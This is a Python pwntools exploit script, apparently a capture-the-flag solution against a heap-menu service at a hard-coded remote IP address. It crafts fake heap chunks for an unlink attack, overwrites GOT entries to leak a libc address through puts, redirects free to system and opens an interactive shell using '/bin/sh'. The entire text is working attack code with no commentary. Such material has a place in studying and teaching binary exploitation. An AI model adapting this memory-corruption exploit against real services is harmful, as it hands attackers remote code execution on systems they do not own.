#!/usr/bin/python

from pwn import *

DEBUG = True

p = remote("52.68.31.117", 5566)
#p = remote('localhost', 4924)
#p = remote("localhost", 4000)

SMALL = 1
BIG = 2
HUGE = 3

size = [0, 0x28, 0xfa0, 0x61a80]

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def keep(option, msg):
  r("Renew secret")
  p.sendline("1")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ") 
  p.sendline(msg)

def wipe(option):
  r("Renew secret")
  p.sendline("2")

  r("Huge secret")
  p.sendline(str(option))

def renew(option, msg):
  r("Renew secret")
  p.sendline("3")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ")
  p.sendline(msg)

def renew_(option, msg):
  r("Renew secret")
  p.sendline("3")

  r("Huge secret")
  p.sendline(str(option))

  r("secret: ")
  p.send(msg)

  sleep(0.1)

target = 0x6020a0

keep(HUGE, "A")
wipe(HUGE)

keep(SMALL, "A")
wipe(SMALL)


keep(BIG, "A")

keep(HUGE, "A")
wipe(HUGE)

keep(SMALL, "A")
wipe(HUGE)

wipe(BIG)


keep(HUGE, "A")
wipe(HUGE)

keep(BIG, "A")
wipe(HUGE)

target = 0x6020a0

payload = p64(0)
payload += p64(0xfa1)
payload += p64(target - 0x18)
payload += p64(target - 0x10)
payload += "\x00" * 0xf80
payload += p64(0xfa0)
payload += p64(0x100)
payload += "A" * 0xf8
payload += p64(0x101)
payload += "A" * 0xf8
payload += p64(0x608e1)

sleep(1)

keep(HUGE, payload)

wipe(SMALL)


free_got = 0x602018
puts_got = 0x602020

puts_plt = 0x4006c0

puts_offset = 0x6f5d0
system_offset = 0x45380

overwrite = '/bin/sh'
overwrite += "\x00" * (0x18 - len(overwrite))
overwrite += p64(free_got) # BIG BUF ptr
overwrite += p64(puts_got) # HUGE BUF ptr
overwrite += p64(0x602088) # BUF ptr
overwrite += p64(0xffffffffffffffff)
overwrite += p64(0xffffffffffffffff)

renew(BIG, overwrite)

renew_(BIG, p64(puts_plt))

wipe(HUGE)

r("\n")
leak = r("\n")[:-1]

leak = leak + "\x00" * (8 - len(leak))
puts_addr = u64(leak)
system_addr = puts_addr - puts_offset + system_offset

print "[*] puts addr: %x" % puts_addr

renew_(BIG, p64(system_addr))

wipe(SMALL)

p.interactive()

p.close()
